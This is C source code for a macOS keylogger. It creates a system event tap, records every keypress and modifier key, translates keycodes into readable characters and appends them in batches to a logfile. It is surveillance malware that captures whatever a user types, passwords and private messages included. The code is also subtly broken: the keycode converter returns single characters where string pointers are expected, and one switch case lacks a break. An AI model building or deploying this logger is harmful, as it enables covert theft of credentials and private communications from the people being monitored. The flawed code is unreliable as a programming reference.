#include "keylogger.h"

CGEventFlags lastFlags = 0;
int BATCH_SZ = 1000;
char buffer[1000];
int buffer_index = 0;

// flush function
void flush() {
  fwrite(buffer, 1, buffer_index, logfile);
  buffer_index = 0;
  memset(buffer, 0, BATCH_SZ);  // clean buf
}

int main(int argc, const char *argv[]) {
  signal(SIGINT, flush);
  signal(SIGTERM, flush);

  // Create an event tap to retrieve keypresses.
  CGEventMask eventMask =
      CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);
  CFMachPortRef eventTap =
      CGEventTapCreate(kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask,
                       CGEventCallback, NULL);

  // Exit the program if unable to create the event tap.
  if (!eventTap) {
    fprintf(stderr, "ERROR: Unable to create event tap.\n");
    exit(1);
  }

  // Create a run loop source and add enable the event tap.
  CFRunLoopSourceRef runLoopSource =
      CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
  CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource,
                     kCFRunLoopCommonModes);
  CGEventTapEnable(eventTap, true);

  // Clear the logfile if clear argument used or log to specific file if given.
  if (argc == 2) {
    if (strcmp(argv[1], "clear") == 0) {
      fopen(logfileLocation, "w");
      printf("%s cleared.\n", logfileLocation);
      fflush(stdout);
      exit(1);
    } else {
      logfileLocation = argv[1];
    }
  }

  // Get the current time and open the logfile.
  time_t result = time(NULL);
  logfile = fopen(logfileLocation, "a");

  if (!logfile) {
    fprintf(stderr,
            "ERROR: Unable to open log file. Ensure that you have the proper "
            "permissions.\n");
    exit(1);
  }

  // Output to logfile.
  fprintf(logfile, "\n\nKeylogging has begun.\n%s\n",
          asctime(localtime(&result)));
  fflush(logfile);

  // Display the location of the logfile and start the loop.
  printf("Logging to: %s\n", logfileLocation);
  fflush(stdout);
  CFRunLoopRun();

  return 0;
}

// The following callback method is invoked on every keypress.
CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type,
                           CGEventRef event, void *refcon) {
  if (type != kCGEventKeyDown && type != kCGEventFlagsChanged) {
    return event;
  }

  CGEventFlags flags = CGEventGetFlags(event);

  // Retrieve the incoming keycode.
  CGKeyCode keyCode =
      (CGKeyCode)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);

  // Calculate key up/down.
  bool down = false;
  if (type == kCGEventFlagsChanged) {
    switch (keyCode) {
      case 54:  // [right-cmd]
      case 55:  // [left-cmd]
        down = (flags & kCGEventFlagMaskCommand) &&
               !(lastFlags & kCGEventFlagMaskCommand);
        break;
      case 56:  // [left-shift]
      case 60:  // [right-shift]
        down = (flags & kCGEventFlagMaskShift) &&
               !(lastFlags & kCGEventFlagMaskShift);
        break;
      case 58:  // [left-option]
      case 61:  // [right-option]
        down = (flags & kCGEventFlagMaskAlternate) &&
               !(lastFlags & kCGEventFlagMaskAlternate);
        break;
      case 59:  // [left-ctrl]
      case 62:  // [right-ctrl]
        down = (flags & kCGEventFlagMaskControl) &&
               !(lastFlags & kCGEventFlagMaskControl);
        break;
      case 57:  // [caps]
        down = (flags & kCGEventFlagMaskAlphaShift) &&
               !(lastFlags & kCGEventFlagMaskAlphaShift);
      default:
        break;
    }
  } else if (type == kCGEventKeyDown) {
    down = true;
  }
  lastFlags = flags;

  // Only log key down events.
  if (!down) {
    return event;
  }

  // Print the human readable key to the logfile.
  bool shift = flags & kCGEventFlagMaskShift;
  bool caps = flags & kCGEventFlagMaskAlphaShift;
  // this should be batched up in a buffer and written to the file in one go
  buffer[buffer_index] = convertKeyCode(keyCode, shift, caps)[0];
  buffer_index++;

  if (buffer_index == BATCH_SZ) flush();
  return event;
}

// The following method converts the key code returned by each keypress as
// a human readable key code in const char format.
const char *letters_cap_set1 = "ASDFHGZXCVBQWERT";
const char *letters_cap_set2 = "OU{IP LJ";
const char *symbols_cap_set1 = "123465+97-80]";

const char *letters_small_set1 = "asdfhgzxcvbqwert";
const char *letters_small_set2 = "ou[ip lj";
const char *symbols_small_set1 = "!@#$^%+(&_*)}";

const char *nums = "01234567 89";

const char *convertKeyCode(int keyCode, bool shift, bool caps) {
  switch ((int)keyCode) {
    case 0 ... 17:
      return shift || caps ? letters_cap_set1[keyCode]
                           : letters_small_set1[keyCode];
    case 18 ... 30:
      return shift || caps ? symbols_cap_set1[keyCode - 18]
                           : symbols_small_set1[keyCode - 18];
    case 31 ... 35:
    // NO 36
    case 37:
    case 38:
      return shift || caps ? letters_cap_set2[keyCode - 31]
                           : letters_small_set2[keyCode - 31];
    case 39:
      return shift ? "\"" : "'";
    case 40:
      return shift || caps ? "K" : "k";
    case 41:
      return shift ? ":" : ";";
    case 42:
      return shift ? "|" : "\\";
    case 43:
      return shift ? "<" : ",";
    case 44:
      return shift ? "?" : "/";
    case 45:
      return shift || caps ? "N" : "n";
    case 46:
      return shift || caps ? "M" : "m";
    case 47:
      return shift ? ">" : ".";
    case 50:
      return shift ? "~" : "`";
    case 65:
      return "[decimal]";
    case 67:
      return "[star]";
    case 69:
      return "[plus]";
    case 71:
      return "[clear]";
    case 75:
      return "[div]";
    case 76:
      return "[enter]";
    case 78:
      return "[hyphen]";
    case 81:
      return "[eq]";

    case 82 ... 89:
    // NO 90
    case 91 ... 92:
      return nums[keyCode - 82];
    case 36:
      return "[ret]";
    case 48:
      return "[tab]";
    case 49:
      return " ";
    case 51:
      return "[del]";
    case 53:
      return "[esc]";
    case 54:
      return "[r-cmd]";
    case 55:
      return "[l-cmd]";
    case 56:
      return "[l-shift]";
    case 57:
      return "[caps]";
    case 58:
      return "[l-option]";
    case 59:
      return "[l-ctrl]";
    case 60:
      return "[r-shift]";
    case 61:
      return "[r-option]";
    case 62:
      return "[r-ctrl]";
    case 63:
      return "[fn]";
    case 64:
      return "[f17]";
    case 72:
      return "[volup]";
    case 73:
      return "[voldown]";
    case 74:
      return "[mute]";
    case 79:
      return "[f18]";
    case 80:
      return "[f19]";
    case 90:
      return "[f20]";
    case 96:
      return "[f5]";
    case 97:
      return "[f6]";
    case 98:
      return "[f7]";
    case 99:
      return "[f3]";
    case 100:
      return "[f8]";
    case 101:
      return "[f9]";
    case 103:
      return "[f11]";
    case 105:
      return "[f13]";
    case 106:
      return "[f16]";
    case 107:
      return "[f14]";
    case 109:
      return "[f10]";
    case 111:
      return "[f12]";
    case 113:
      return "[f15]";
    case 114:
      return "[help]";
    case 115:
      return "[home]";
    case 116:
      return "[pgup]";
    case 117:
      return "[fwddel]";
    case 118:
      return "[f4]";
    case 119:
      return "[end]";
    case 120:
      return "[f2]";
    case 121:
      return "[pgdown]";
    case 122:
      return "[f1]";
    case 123:
      return "[left]";
    case 124:
      return "[right]";
    case 125:
      return "[down]";
    case 126:
      return "[up]";
  }
  return "[unknown]";
}
